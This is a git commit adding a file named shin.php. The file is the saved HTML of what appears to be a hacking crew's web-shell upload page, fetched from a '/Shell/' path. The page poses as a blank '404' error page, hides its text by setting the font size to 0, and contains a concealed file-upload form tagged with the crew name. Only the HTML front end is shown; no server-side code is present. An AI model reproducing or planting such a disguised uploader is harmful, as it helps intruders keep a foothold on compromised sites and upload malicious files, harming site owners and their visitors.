9e5efe9a3e1f8c5a16f3e5178c03155e6f51ca00
WalidMahmoud101 <53156881+WalidMahmoud101@users.noreply.github.com>
2020-12-28 01:58:08 +0200

    Add files via upload

---
+++ shin.php
@@ -0,0 +1,6 @@
+
+<!-- saved from url=(0029)http://faox.dk/Shell/shin.php -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body><img class=" height=" 200"="" src="./shin_files/photo-2.jpg"><title>404</title>
+<font face="Courier new" color="black" size="6">| _ByME - Mohamed Arafa- WalidMahmoud |</font>
+<style>body{font-size: 0;}h1{font-size: 12px}</style>
+<h1><form method="post" enctype="multipart/form-data"><input type="file" name="f"><input name="v" type="submit" id="v" value="BAKUHANTAMCREW"> <br></form></h1></body></html>
